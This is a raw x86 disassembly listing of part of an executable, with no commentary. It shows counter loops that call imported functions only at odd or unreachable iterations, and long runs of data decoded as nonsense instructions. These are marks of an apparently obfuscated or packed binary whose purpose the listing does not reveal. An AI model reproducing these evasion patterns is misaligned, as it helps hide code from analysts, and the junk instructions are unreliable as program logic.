  40b00c:	and    DWORD PTR ds:0x41abca,0x0
  40b016:	jmp    0x40b02a
  40b01b:	xor    edi,edi
  40b01d:	xor    edi,DWORD PTR ds:0x41abca
  40b023:	inc    edi
  40b024:	mov    DWORD PTR ds:0x41abca,edi
  40b02a:	cmp    DWORD PTR ds:0x41abca,0x12
  40b031:	jae    0x40b05b
  40b037:	cmp    DWORD PTR ds:0x41abca,0x1d
  40b03e:	jne    0x40b054
  40b044:	push   0x27af
  40b049:	push   0x17d7
  40b04e:	call   DWORD PTR ds:0x40d028
  40b054:	jmp    0x40b01b
  40b059:	or     esi,edi
  40b05b:	mov    esi,0x7879
  40b060:	mov    edi,0x1556
  40b065:	mov    DWORD PTR ds:0x4245b2,0x3a32
  40b06f:	xchg   esi,ecx
  40b071:	mov    ecx,DWORD PTR ds:0x41238c
  40b077:	mov    ecx,DWORD PTR [ecx]
  40b079:	or     DWORD PTR ds:0x417e49,ecx
  40b07f:	sub    edx,edi
  40b081:	and    ecx,DWORD PTR ds:0x412368
  40b087:	xor    esi,esi
  40b089:	adc    ecx,DWORD PTR ds:0x4245ae
  40b08f:	mov    DWORD PTR [ebp-0x28],esi
  40b092:	mov    DWORD PTR [ebp-0x2c],esi
  40b095:	add    ecx,DWORD PTR ds:0x41abd6
  40b09b:	mov    DWORD PTR [ebp-0x14],esi
  40b09e:	and    DWORD PTR ds:0x41510d,ebx
  40b0a4:	jmp    0x40b189
  40b0a9:	scas   al,BYTE PTR es:[edi]
  40b0aa:	mov    ch,0x8b
  40b0ac:	imul   edi,DWORD PTR [ecx+0x69],0x6e
  40b0b0:	pop    ecx
  40b0b1:	(bad)  
  40b0b2:	pusha  
  40b0b3:	fisttp WORD PTR [ecx-0x1b]
  40b0b6:	mov    cl,0x3d
  40b0b8:	into   
  40b0b9:	leave  
  40b0ba:	aas    
  40b0bb:	jle    0x40b13b
  40b0bd:	mov    dh,0x7e
  40b0bf:	jle    0x40b13f
  40b0c1:	(bad)  
  40b0c3:	(bad)  
  40b0c4:	sub    BYTE PTR [edx],dh
  40b0c6:	shr    al,0xf4
  40b0c9:	retf   0x317f
  40b0cc:	les    edx,FWORD PTR [ecx]
  40b0ce:	mov    bh,0xbf
  40b0d0:	mov    cl,0xbb
  40b0d2:	es into 
  40b0d4:	loop   0x40b0b8
  40b0d6:	mov    esp,0x817afeb
  40b0db:	or     eax,0xed740696
  40b0e0:	inc    ecx
  40b0e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b0e2:	outs   dx,DWORD PTR ds:[esi]
  40b0e3:	int3   
  40b0e4:	gs sti 
  40b0e6:	pop    eax
  40b0e7:	cli    
  40b0e8:	aam    0xed
  40b0ea:	or     eax,0x736549b1
  40b0ef:	out    dx,eax
  40b0f0:	pop    edi
  40b0f1:	mov    bl,dl
  40b0f3:	pop    ds
  40b0f4:	iret   
  40b0f5:	(bad)  
  40b0f6:	sub    bl,BYTE PTR ss:[edx-0x16ad40d3]
  40b0fd:	jmp    FWORD PTR [eax]
  40b0ff:	mov    dh,0x42
  40b101:	push   edi
  40b102:	fs pop ds
  40b104:	pop    ebx
  40b105:	in     al,dx
  40b106:	fild   QWORD PTR [eax]
  40b108:	jp     0x40b139
  40b10a:	fcom   QWORD PTR [esi]
  40b10c:	(bad)  
  40b10d:	pop    ebx
  40b10e:	test   BYTE PTR [ecx],0xb9
  40b111:	add    BYTE PTR [esi],cl
  40b113:	sub    BYTE PTR [edi+0x1a],bl
  40b116:	mov    ds:0x1eb4bff3,al
  40b11b:	aam    0xae
  40b11d:	xchg   edx,eax
  40b11e:	pop    ds
  40b11f:	hlt    
  40b120:	in     al,dx
  40b121:	and    dl,al
  40b123:	fisubr DWORD PTR [edi]
  40b125:	xchg   DWORD PTR [ebx+ebp*2+0x1aa38310],eax
  40b12c:	xchg   BYTE PTR [edi+0x17dc1f25],bh
  40b132:	pop    edi
  40b133:	sbb    eax,0xa5e7a9ce
  40b138:	shr    esi,1
  40b13a:	data16 and BYTE PTR [ebx+0x53],0xdd
  40b13f:	add    eax,0x6621b7c3
  40b144:	jb     0x40b0d0
  40b146:	out    dx,al
  40b147:	scas   eax,DWORD PTR es:[edi]
  40b148:	iret   
  40b149:	imul   eax,edi,0x9383a407
  40b14f:	inc    ebx
  40b150:	push   cs
  40b151:	shr    BYTE PTR [eax],0x36
  40b154:	and    ebp,DWORD PTR [ecx-0x54]
  40b157:	adc    DWORD PTR [edx+edi*1+0x14],edi
  40b15b:	in     eax,dx
  40b15c:	mov    esp,DWORD PTR [esi-0x70]
  40b15f:	sbb    BYTE PTR [ebx-0xe],al
  40b162:	jge    0x40b117
  40b164:	mov    eax,0x2ab2d157
  40b169:	ins    DWORD PTR es:[edi],dx
  40b16a:	jmp    0x72761905
  40b16f:	shl    edx,1
  40b171:	xor    dh,BYTE PTR [ebp+0x3cf9650e]
  40b177:	test   eax,0xddfa9c83
  40b17c:	rcr    DWORD PTR [eax+0x10f7f051],1
  40b182:	(bad)  
  40b183:	imul   esp,DWORD PTR [edi+0x31041e8e],0xffffff89
  40b18a:	jne    0x40b184
  40b18c:	movzx  ecx,BYTE PTR ds:0x41abce
  40b193:	and    DWORD PTR ds:0x415115,ecx
  40b199:	jmp    0x40b27e
  40b19e:	mov    ebp,0xc5aa0686
  40b1a3:	stos   BYTE PTR es:[edi],al
  40b1a4:	popa   
  40b1a5:	jns    0x40b1e6
  40b1a7:	in     eax,dx
  40b1a8:	(bad)  
  40b1a9:	mov    ah,0x7c
  40b1ab:	nop
  40b1ac:	pop    edx
  40b1ad:	xchg   ebp,eax
  40b1ae:	add    DWORD PTR [esi+edi*2],edi
  40b1b1:	jle    0x40b169
  40b1b3:	jle    0x40b233
  40b1b5:	jle    0x40b1a0
  40b1b7:	pushf  
  40b1b8:	inc    ebx
  40b1b9:	sub    al,0x73
  40b1bb:	nop
  40b1bc:	mov    ecx,0x26c3d0bc
  40b1c1:	xchg   edx,eax
  40b1c2:	push   ebx
  40b1c3:	retf   0xa35d
  40b1c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1c7:	and    al,0x2
  40b1c9:	and    dh,BYTE PTR [ebx]
  40b1cb:	sub    al,0x5c
  40b1cd:	xchg   ebp,eax
  40b1ce:	xor    dh,BYTE PTR [edi]
  40b1d0:	mov    edx,0x855952bb
  40b1d5:	clc    
  40b1d6:	outs   dx,BYTE PTR cs:[esi]
  40b1d8:	xor    edx,DWORD PTR [ebx-0x2b113f26]
  40b1de:	mov    WORD PTR [edx+0x78d0b80a],gs
  40b1e4:	pushf  
  40b1e5:	mov    dl,0x2d
  40b1e7:	fbld   TBYTE PTR [esi+eiz*8]
  40b1ea:	mov    eax,0x281087d8
  40b1ef:	cdq    
  40b1f0:	sub    BYTE PTR [edi+0x72afcbbf],ah
  40b1f6:	jg     0x40b200
  40b1f8:	xor    ecx,esi
  40b1fa:	jae    0x40b228
  40b1fc:	sbb    edi,edx
  40b1fe:	push   ecx
  40b1ff:	scas   al,BYTE PTR es:[edi]
  40b200:	sbb    eax,DWORD PTR [ecx]
  40b202:	loop   0x40b1d7
  40b204:	push   ds
  40b205:	or     al,0x93
  40b207:	dec    ebp
  40b208:	mov    DWORD PTR [edi+0x3c700646],0xc6403ee9
  40b212:	dec    ecx
  40b213:	pop    edi
  40b214:	sub    al,0xc1
  40b216:	ds loop 0x40b232
  40b219:	dec    ebx
  40b21a:	lods   eax,DWORD PTR ds:[esi]
  40b21b:	mov    cl,0xb1
  40b21d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b21e:	aaa    
  40b21f:	iret   
  40b220:	xor    al,BYTE PTR [ebx+0x5d]
  40b223:	sub    eax,0x87718d1b
  40b228:	nop
  40b229:	aam    0x1e
  40b22b:	or     eax,0x67feedc8
  40b230:	ss mov dl,0xe8
  40b233:	(bad)  
  40b234:	jnp    0x40b28c
  40b236:	jmp    0xc408c209
  40b23b:	adc    edi,esi
  40b23d:	(bad)  
  40b23e:	jno    0x40b225
  40b240:	ficomp DWORD PTR [edi+0x35f100d1]
  40b246:	sbb    BYTE PTR [edx-0x4d],cl
  40b249:	stc    
  40b24a:	sbb    edx,DWORD PTR [ecx+0x7c]
  40b24d:	in     eax,0xea
  40b24f:	push   edx
  40b250:	out    0xf,al
  40b252:	mov    dl,0xa4
  40b254:	iret   
  40b255:	sbb    BYTE PTR [ecx-0x33],bl
  40b258:	or     dh,BYTE PTR [ebx+0x60]
  40b25b:	sbb    bl,BYTE PTR [edi]
  40b25d:	loop   0x40b275
  40b25f:	pop    ebx
  40b260:	aam    0x2d
  40b262:	repz add al,bh
  40b265:	aaa    
  40b266:	mov    ch,0xd3
  40b268:	fidivr WORD PTR fs:[eax+eiz*4+0x520fb4d0]
  40b271:	sub    DWORD PTR [eax-0xf],edx
  40b274:	outs   dx,BYTE PTR ds:[esi]
  40b275:	sahf   
  40b276:	inc    ecx
  40b277:	ss fwait
  40b279:	aas    
  40b27a:	gs mov esi,0x4d8b4239
  40b280:	call   0x513de006
  40b285:	inc    ecx
  40b286:	add    dl,bl
  40b288:	stos   DWORD PTR es:[edi],eax
  40b289:	inc    ecx
  40b28a:	add    BYTE PTR [ebx],dh
  40b28c:	enter  0xff33,0x9
  40b290:	cmp    eax,0x41236c
  40b295:	add    ecx,ebx
  40b297:	not    eax
  40b299:	mov    DWORD PTR [ebp-0x20],ecx
  40b29c:	mov    eax,DWORD PTR [ebp-0x20]
  40b29f:	je     0x40bb71
  40b2a5:	mov    eax,ds:0x415105
  40b2aa:	xor    DWORD PTR ds:0x412354,eax
  40b2b0:	mov    eax,DWORD PTR [ebp-0x4]
  40b2b3:	xor    eax,0x7510859
  40b2b8:	and    DWORD PTR ds:0x4245ae,0x412358
  40b2c2:	add    eax,ebx
  40b2c4:	mov    DWORD PTR ds:0x4245ae,0x20c7
  40b2ce:	cmp    edi,eax
  40b2d0:	jmp    0x40b3b5
  40b2d5:	push   edi
  40b2d6:	pop    es
  40b2d7:	popf   
  40b2d8:	aam    0x6d
  40b2da:	fs push edi
  40b2dc:	test   DWORD PTR [edx-0x5f19a5cd],edx
  40b2e2:	sti    
  40b2e3:	push   ds
  40b2e4:	jg     0x40b33f
  40b2e6:	cmp    al,0x7e
  40b2e8:	jle    0x40b2a0
  40b2ea:	jle    0x40b36a
  40b2ec:	jle    0x40b2a8
  40b2ee:	lahf   
  40b2ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b2f0:	push   ebx
  40b2f1:	cwde   
  40b2f2:	sbb    BYTE PTR [edx+0x38c5b977],0x6e
  40b2f9:	and    dh,ch
  40b2fb:	into   
  40b2fc:	jle    0x40b2f3
  40b2fe:	rol    BYTE PTR [edi-0x3e3f254a],0x5d
  40b305:	lock jne 0x40b31f
  40b308:	fist   DWORD PTR [edi+ecx*8+0x14]
  40b30c:	clc    
  40b30d:	mov    cl,0xb4
  40b30f:	adc    esp,DWORD PTR [esi-0x78dae7e9]
  40b315:	test   eax,0x246ab87b
  40b31a:	and    eax,0x48c2796f
  40b31f:	mov    ebp,0x5b087ea4
  40b324:	out    0xc4,al
  40b326:	fsub   st,st(5)
  40b328:	mov    BYTE PTR [ebx],ah
  40b32a:	adc    eax,0x611d0cf
  40b32f:	inc    esp
  40b330:	arpl   WORD PTR [ecx+0x22],bx
  40b333:	cwde   
  40b334:	cmp    edi,DWORD PTR [edx+0x2f1bd58b]
  40b33a:	inc    esp
  40b33b:	(bad)  
  40b33c:	out    dx,al
  40b33d:	cmp    edi,DWORD PTR [esi+0x7b]
  40b340:	fstp   TBYTE PTR [ebp+0x18]
  40b343:	push   esi
  40b344:	adc    ah,BYTE PTR [esi]
  40b346:	jle    0x40b30d
  40b348:	bnd jbe 0x40b3a7
  40b34b:	inc    ebx
  40b34c:	jns    0x40b35a
  40b34e:	xor    BYTE PTR [ebx-0x36],0xc4
  40b352:	push   ebx
  40b353:	mov    ecx,0xe56c493
  40b358:	aaa    
  40b359:	jmp    0x4ad62d01
  40b35e:	sbb    al,0x9f
  40b360:	scas   eax,DWORD PTR es:[edi]
  40b361:	sub    al,bh
  40b363:	fcom   QWORD PTR [esi+0xfe0e8a2]
  40b369:	sahf   
  40b36a:	fimul  DWORD PTR [ebx]
  40b36c:	pop    edi
  40b36d:	xlat   BYTE PTR ds:[ebx]
  40b36e:	fs aam 0x4e
  40b371:	jo     0x40b3bf
  40b373:	das    
  40b374:	lods   eax,DWORD PTR ds:[esi]
  40b375:	int    0x54
  40b377:	outs   dx,DWORD PTR ds:[esi]
  40b378:	sar    DWORD PTR [eax],0x15
  40b37b:	and    eax,0x1131c789
  40b380:	sbb    ecx,edx
  40b382:	leave  
  40b383:	aas    
  40b384:	fiadd  DWORD PTR [ebx+0x2a987df7]
  40b38a:	imul   edx,edi,0x5073b5a4
  40b390:	loopne 0x40b36b
  40b392:	std    
  40b393:	aad    0x18
  40b395:	fxch   st(0)
  40b397:	pop    eax
  40b398:	icebp  
  40b399:	add    BYTE PTR [edi-0x69],dh
  40b39c:	into   
  40b39d:	fnsave [edi+0xdada3f9]
  40b3a3:	and    edi,edi
  40b3a5:	pop    ebp
  40b3a6:	ja     0x40b32f
  40b3a8:	jbe    0x40b40e
  40b3aa:	and    eax,0xe75352d4
  40b3af:	add    DWORD PTR [edx],edx
  40b3b1:	mov    esi,0xf660a42
  40b3b6:	test   DWORD PTR [edi-0xfffffb],ecx
  40b3bc:	jne    0x40b3c6
  40b3be:	mov    DWORD PTR ds:0x41abe2,0x7935
  40b3c8:	call   0x40a5e1
  40b3cd:	and    DWORD PTR ds:0x41237c,0x0
  40b3d7:	jmp    0x40b3eb
  40b3dc:	xor    ecx,ecx
  40b3de:	add    ecx,DWORD PTR ds:0x41237c
  40b3e4:	inc    ecx
  40b3e5:	mov    DWORD PTR ds:0x41237c,ecx
  40b3eb:	cmp    DWORD PTR ds:0x41237c,0x18
  40b3f2:	jae    0x40b452
  40b3f8:	cmp    DWORD PTR ds:0x41237c,0x24
  40b3ff:	jne    0x40b40e
  40b405:	push   DWORD PTR [ebp-0x14]
  40b408:	call   DWORD PTR ds:0x40d02c
  40b40e:	jmp    0x40b3dc
  40b413:	mov    DWORD PTR ds:0x415101,0x17
  40b41d:	cmp    DWORD PTR ds:0x415101,0x0
  40b424:	je     0x40b452
  40b42a:	cmp    DWORD PTR ds:0x415101,0x1d
  40b431:	jne    0x40b440
  40b437:	push   DWORD PTR [ebp-0xc]
  40b43a:	call   DWORD PTR ds:0x40d3a4
  40b440:	mov    esi,DWORD PTR ds:0x415101
  40b446:	dec    esi
  40b447:	mov    DWORD PTR ds:0x415101,esi
  40b44d:	jmp    0x40b41d
  40b452:	mov    DWORD PTR [ebp-0x20],eax
  40b455:	and    DWORD PTR ds:0x4245c2,0x0
  40b45f:	mov    eax,ds:0x4245c2
  40b464:	inc    eax
  40b465:	mov    ds:0x4245c2,eax
  40b46a:	cmp    DWORD PTR ds:0x4245c2,0x6
  40b471:	jne    0x40b485
  40b477:	push   DWORD PTR [ebp-0x10]
  40b47a:	push   0x41ad5b
  40b47f:	call   DWORD PTR ds:0x40d20c
  40b485:	cmp    DWORD PTR ds:0x4245c2,0x5
  40b48c:	jne    0x40b4a0
  40b492:	xor    eax,eax
  40b494:	or     eax,DWORD PTR ds:0x4245c2
  40b49a:	inc    eax
  40b49b:	mov    ds:0x4245c2,eax
  40b4a0:	cmp    DWORD PTR ds:0x4245c2,0x15
  40b4a7:	jb     0x40b45f
  40b4ad:	mov    DWORD PTR ds:0x41abca,0x15
  40b4b7:	cmp    DWORD PTR ds:0x41abca,0x0
  40b4be:	je     0x40b50b
  40b4c4:	cmp    DWORD PTR ds:0x41abca,0x22
  40b4cb:	jne    0x40b4f1
  40b4d1:	push   DWORD PTR [ebp-0x14]
  40b4d4:	push   DWORD PTR [ebp-0xc]
  40b4d7:	push   DWORD PTR [ebp-0x18]
  40b4da:	push   DWORD PTR [ebp-0x14]
  40b4dd:	push   DWORD PTR [ebp-0x1c]
  40b4e0:	push   DWORD PTR [ebp-0x1c]
  40b4e3:	push   0x15ca
  40b4e8:	push   DWORD PTR [ebp-0x28]
  40b4eb:	call   DWORD PTR ds:0x40d030
  40b4f1:	xor    ecx,ecx
  40b4f3:	or     ecx,DWORD PTR ds:0x41abca
  40b4f9:	dec    ecx
  40b4fa:	mov    DWORD PTR ds:0x41abca,ecx
  40b500:	jmp    0x40b4b7
  40b505:	sbb    DWORD PTR ds:0x41abd6,edi
  40b50b:	mov    eax,DWORD PTR [ebp-0x4]
  40b50e:	mov    ecx,DWORD PTR [ebp-0x20]
  40b511:	not    esi
  40b513:	mov    esi,0x7510859
  40b518:	xor    eax,esi
  40b51a:	sub    DWORD PTR ds:0x4245b6,0x7cc8
  40b524:	add    eax,ebx
  40b526:	cmp    ecx,eax
  40b528:	jmp    0x40b60d
  40b52d:	add    edi,ebx
  40b52f:	or     al,0xde
  40b531:	in     al,0xe9
  40b533:	loope  0x40b530
  40b535:	js     0x40b579
  40b537:	dec    ebp
  40b538:	inc    edi
  40b539:	std    
  40b53a:	ins    BYTE PTR es:[edi],dx
  40b53b:	or     BYTE PTR [ebx],0x91
  40b53e:	cmp    eax,0x7eb67e7e
  40b543:	jle    0x40b5c3
  40b545:	mov    edx,DWORD PTR [ebx+0x4b]
  40b548:	mov    ah,0xee
  40b54a:	sbb    al,0xc8
  40b54c:	mov    ch,0xc3
  40b54e:	shl    BYTE PTR [ebp+ecx*1-0x39698c8],0x69
  40b556:	xchg   esi,eax
  40b557:	and    eax,esp
  40b559:	leave  
  40b55a:	loope  0x40b5a0
  40b55c:	push   ecx
  40b55d:	xor    dh,dl
  40b55f:	xor    eax,0x63aecca8
  40b564:	mov    dl,BYTE PTR [ebx-0x6cae95e3]
  40b56a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b56b:	push   cs
  40b56c:	or     DWORD PTR [edi],ebx
  40b56e:	push   edi
  40b56f:	sub    ebp,DWORD PTR [edx-0xd]
  40b572:	ror    DWORD PTR [esi-0x67e74dc1],1
  40b578:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b579:	push   edi
  40b57a:	ret    
  40b57b:	ss stos BYTE PTR es:[edi],al
  40b57d:	mov    ah,0xb5
  40b57f:	pop    ebx
  40b580:	pop    edi
  40b581:	or     eax,edx
  40b583:	fild   DWORD PTR [ecx-0x22]
  40b586:	adc    DWORD PTR [ebp+0x27045c0c],0x4e
  40b58d:	or     al,0xf5
  40b58f:	lahf   
  40b590:	push   ss
  40b591:	sbb    DWORD PTR [edi],ecx
  40b593:	in     al,0x47
  40b595:	(bad)  
  40b596:	push   ecx
  40b597:	xchg   ecx,eax
  40b598:	and    esi,edx
  40b59a:	mov    edi,edi
  40b59c:	push   ds
  40b59d:	push   0xc06f0b3f
  40b5a2:	jle    0x40b5f4
  40b5a4:	cmp    ah,bh
  40b5a6:	test   DWORD PTR [edx],ebx
  40b5a8:	or     DWORD PTR [esi+0x3693dc],ebx
  40b5ae:	push   ebp
  40b5af:	inc    eax
  40b5b0:	fild   DWORD PTR [edx]
  40b5b2:	adc    dl,BYTE PTR [esi+0x26f4516e]
  40b5b8:	ret    
  40b5b9:	mov    esi,0x6e854542
  40b5be:	xchg   ebx,eax
  40b5bf:	dec    ecx
  40b5c0:	cmp    ebx,DWORD PTR [eax+0x2d]
  40b5c3:	sbb    eax,0xc2174e52
  40b5c8:	add    ecx,DWORD PTR [edi]
  40b5ca:	mov    edx,0x8f38e7e1
  40b5cf:	ret    0xaaf2
  40b5d2:	or     dl,al
  40b5d4:	jle    0x40b63b
  40b5d6:	xchg   edx,eax
  40b5d7:	sub    eax,0x73697b0
  40b5dc:	sub    DWORD PTR [esp+esi*1],esp
  40b5df:	push   es
  40b5e0:	add    ebx,DWORD PTR [eax+0x71]
  40b5e3:	fisubr DWORD PTR [edi+0x927ad47]
  40b5e9:	out    0x66,eax
  40b5eb:	pop    ss
  40b5ec:	retf   
  40b5ed:	gs mov dh,0x97
  40b5f0:	cmc    
  40b5f1:	loope  0x40b613
  40b5f3:	icebp  
  40b5f4:	loop   0x40b5e4
  40b5f6:	sti    
  40b5f7:	and    al,0xa3
  40b5f9:	mov    dh,bl
  40b5fb:	sub    al,0x5f
  40b5fd:	or     eax,0xfa100f9d
  40b602:	daa    
  40b603:	or     DWORD PTR [edi+0x26],edi
  40b606:	ins    BYTE PTR es:[edi],dx
  40b607:	jno    0x40b664
  40b609:	inc    ebp
  40b60a:	and    BYTE PTR [edi+0x3a],ah
  40b60d:	je     0x40bb55
  40b613:	sbb    DWORD PTR ds:0x415115,0x412368
  40b61d:	push   DWORD PTR [ebp-0x20]
  40b620:	jmp    0x40b705
  40b625:	sti    
  40b626:	loopne 0x40b67d
  40b628:	lock push ebp
  40b62a:	cdq    
  40b62b:	sti    
  40b62c:	jns    0x40b666
  40b62e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b62f:	pop    ecx
  40b630:	out    0x1d,al
  40b632:	pusha  
  40b633:	jae    0x40b5c3
  40b635:	jmp    0xb6bf346c
  40b63a:	jle    0x40b6ba
  40b63c:	jle    0x40b680
  40b63e:	mov    DWORD PTR [eax-0x3a8300b7],edi
  40b644:	or     al,0xfe
  40b646:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b647:	dec    ebx
  40b648:	push   ebx
  40b649:	shr    BYTE PTR [ebx],1
  40b64b:	(bad)  
  40b64c:	ffreep st(1)
  40b64e:	jne    0x40b650
  40b650:	add    DWORD PTR [ecx],0x8f97d105
  40b656:	mov    ds:0xdbeec81d,al
  40b65b:	sbb    dh,BYTE PTR ds:0xe6b4c0dd
  40b661:	or     DWORD PTR [ecx],esp
  40b663:	adc    eax,0x92654e09
  40b668:	mov    bl,0x55
  40b66a:	ins    DWORD PTR es:[edi],dx
  40b66b:	sti    
  40b66c:	ret    0x162c
  40b66f:	fcom   DWORD PTR [edx-0x50db615d]
  40b675:	mov    edi,0x7d86744c
  40b67a:	xchg   ebx,eax
  40b67b:	fst    QWORD PTR [esi+eax*4]
  40b67e:	jae    0x40b68d
  40b680:	add    BYTE PTR [eax],ah
  40b682:	shr    bh,0xa3
  40b685:	retf   0x4747
  40b688:	cmc    
  40b689:	sub    DWORD PTR [edx+0x10cd1e9d],ebx
  40b68f:	cmc    
  40b690:	les    eax,FWORD PTR [ebx+0x1a]
  40b693:	leave  
  40b694:	retf   
  40b695:	or     al,0x8d
  40b697:	js     0x40b6e5
  40b699:	fild   WORD PTR [esi+0x51]
  40b69c:	push   ecx
  40b69d:	sub    edi,esi
  40b69f:	mov    ds:0x1ae9da23,al
  40b6a4:	outs   dx,BYTE PTR ds:[esi]
  40b6a5:	jmp    0x529a:0x940c7b21
  40b6ac:	mov    al,0x85
  40b6ae:	mov    ah,0x36
  40b6b0:	(bad)  
  40b6b1:	fdivr  QWORD PTR [eax-0x4ffd66ee]
  40b6b7:	lahf   
  40b6b8:	inc    eax
  40b6b9:	cs retf 
  40b6bb:	inc    ebp
  40b6bc:	mov    esi,?
  40b6be:	iret   
  40b6bf:	push   edx
  40b6c0:	hlt    
  40b6c1:	int    0x13
  40b6c3:	ss (bad) 
  40b6c5:	in     al,dx
  40b6c6:	xor    DWORD PTR [esi+0x1491c2f3],ebx
  40b6cc:	test   cl,dh
  40b6ce:	lea    ebx,[ecx+0x476a02f4]
  40b6d4:	aas    
  40b6d5:	loope  0x40b6b9
  40b6d7:	jo     0x40b70f
  40b6d9:	psubusb mm3,mm0
  40b6dc:	sub    ebp,DWORD PTR [eax+0x49]
  40b6df:	mov    ebx,0x489c29bb
  40b6e4:	hlt    
  40b6e5:	pop    ebp
  40b6e6:	aas    
  40b6e7:	jecxz  0x40b6ed
  40b6e9:	das    
  40b6ea:	jg     0x40b71a
  40b6ec:	or     BYTE PTR [esi+0x7327529f],0x9a
  40b6f3:	stos   BYTE PTR es:[edi],al
  40b6f4:	or     edi,edx
  40b6f6:	cwde   
  40b6f7:	cmp    DWORD PTR [edi+eax*2+0xe],esi
  40b6fb:	(bad)
  40b6fe:	in     eax,dx
  40b6ff:	jne    0x40b76e
  40b701:	aas    
  40b702:	add    DWORD PTR [ebp-0x20],0xe80875ff
  40b709:	mov    ebp,0x9ffffef
  40b70e:	cmp    eax,0x41abde
  40b713:	mov    DWORD PTR [ebp-0x14],eax
  40b716:	mov    eax,DWORD PTR [ebp-0x4]
  40b719:	adc    ecx,DWORD PTR ds:0x412370
  40b71f:	mov    ecx,DWORD PTR [ebp-0x14]
  40b722:	adc    DWORD PTR ds:0x4245ba,0x45e4
  40b72c:	xor    eax,esi
  40b72e:	add    eax,ebx
  40b730:	mov    DWORD PTR ds:0x415111,0x202e
  40b73a:	cmp    ecx,eax
  40b73c:	mov    DWORD PTR ds:0x412364,0x4412
  40b746:	je     0x40bb55
  40b74c:	and    DWORD PTR ds:0x417e49,0x0
  40b756:	mov    eax,ds:0x417e49
  40b75b:	inc    eax
  40b75c:	mov    ds:0x417e49,eax
  40b761:	cmp    DWORD PTR ds:0x417e49,0x22
  40b768:	jne    0x40b798
  40b76e:	push   0x415115
  40b773:	push   0x2bf6
  40b778:	push   DWORD PTR [ebp-0x14]
  40b77b:	push   0x415111
  40b780:	push   DWORD PTR [ebp-0x10]
  40b783:	push   0x41adfd
  40b788:	push   0x4def
  40b78d:	push   0x3000
  40b792:	call   DWORD PTR ds:0x40d210
  40b798:	cmp    DWORD PTR ds:0x417e49,0x12
  40b79f:	jb     0x40b756
  40b7a5:	mov    eax,DWORD PTR [ebp-0x14]
  40b7a8:	mov    eax,DWORD PTR [eax+0x18]
  40b7ab:	movzx  ecx,BYTE PTR ds:0x417e4d
  40b7b2:	sbb    DWORD PTR ds:0x41237c,ecx
  40b7b8:	mov    DWORD PTR [ebp-0x20],eax
  40b7bb:	xor    eax,eax
  40b7bd:	or     eax,DWORD PTR ds:0x412390
  40b7c3:	xor    ecx,ecx
  40b7c5:	xor    ecx,DWORD PTR ds:0x417eaa
  40b7cb:	sub    ecx,eax
  40b7cd:	sub    eax,DWORD PTR [eax+ecx*1]
  40b7d0:	mov    eax,DWORD PTR [ebp-0x14]
  40b7d3:	sub    DWORD PTR ds:0x4245b6,0x1830
  40b7dd:	mov    ecx,DWORD PTR [ebp+0x8]
  40b7e0:	add    DWORD PTR ds:0x41235c,0x415101
  40b7ea:	add    ecx,DWORD PTR [eax+0x20]
  40b7ed:	mov    DWORD PTR [ebp-0x28],ecx
  40b7f0:	mov    DWORD PTR ds:0x417e59,0x1f
  40b7fa:	cmp    DWORD PTR ds:0x417e59,0x0
  40b801:	je     0x40b84b
  40b807:	cmp    DWORD PTR ds:0x417e59,0xf
  40b80e:	jne    0x40b823
  40b814:	push   DWORD PTR [ebp-0x1c]
  40b817:	push   DWORD PTR [ebp-0x10]
  40b81a:	push   DWORD PTR [ebp-0x28]
  40b81d:	call   DWORD PTR ds:0x40d034
  40b823:	cmp    DWORD PTR ds:0x417e59,0x10
  40b82a:	jne    0x40b83b
  40b830:	mov    eax,ds:0x417e59
  40b835:	dec    eax
  40b836:	mov    ds:0x417e59,eax
  40b83b:	mov    eax,ds:0x417e59
  40b840:	dec    eax
  40b841:	mov    ds:0x417e59,eax
  40b846:	jmp    0x40b7fa
  40b84b:	mov    eax,DWORD PTR [ebp-0x14]
  40b84e:	mov    ecx,DWORD PTR [ebp+0x8]
  40b851:	add    ecx,DWORD PTR [eax+0x24]
  40b854:	jmp    0x40b939
  40b859:	mov    ch,0x76
  40b85b:	or     DWORD PTR [ecx+ecx*2+0x59],eax
  40b85f:	pop    ecx
  40b860:	pop    es
  40b861:	aas    
  40b862:	mov    edx,0x328023e6
  40b867:	xchg   BYTE PTR [edx],ch
  40b869:	and    DWORD PTR [ebx],esi
  40b86b:	jle    0x40b8eb
  40b86d:	mov    dh,0x7e
  40b86f:	jle    0x40b8ef
  40b871:	imul   esi,DWORD PTR [ecx+0x6583f430],0x9b4a1bef
  40b87b:	adc    edi,eax
  40b87d:	pushf  
  40b87e:	adc    esp,edx
  40b880:	(bad)  
  40b881:	dec    ecx
  40b882:	mov    esp,0x2f712c05
  40b887:	mov    edi,edx
  40b889:	les    ebp,FWORD PTR [ebx]
  40b88b:	xchg   esi,eax
  40b88c:	jae    0x40b854
  40b88e:	push   esp
  40b88f:	xlat   BYTE PTR ds:[ebx]
  40b890:	pop    edx
  40b891:	xchg   DWORD PTR [ecx],ecx
  40b893:	jbe    0x40b89a
  40b895:	add    esp,esp
  40b897:	adc    bh,dh
  40b899:	xchg   ebx,eax
  40b89a:	cmp    DWORD PTR ds:0x7144fe24,0xfffffffd
  40b8a1:	push   esi
  40b8a2:	leave  
  40b8a3:	iret   
  40b8a4:	mov    ch,0x5a
  40b8a6:	adc    ah,BYTE PTR [ebp-0x3aeccdf3]
  40b8ac:	ins    BYTE PTR es:[edi],dx
  40b8ad:	ret    0x1ed8
  40b8b0:	out    0xc5,eax
  40b8b2:	arpl   ax,cx
  40b8b4:	in     al,dx
  40b8b5:	outs   dx,BYTE PTR ds:[esi]
  40b8b6:	mov    eax,ds:0xf9b64cc6
  40b8bb:	mov    edi,0x91e872f0
  40b8c0:	push   esi
  40b8c1:	pop    ebp
  40b8c2:	xor    ah,BYTE PTR [ecx]
  40b8c4:	dec    ecx
  40b8c5:	rol    BYTE PTR [edx-0x45],1
  40b8c8:	fld    QWORD PTR [ecx-0x3bbdd1e1]
  40b8ce:	and    al,0x4e
  40b8d0:	cwde   
  40b8d1:	cmp    BYTE PTR [ecx-0x11a9313e],bh
  40b8d7:	add    eax,0x5c66a84a
  40b8dc:	int    0x56
  40b8de:	jp     0x40b8c3
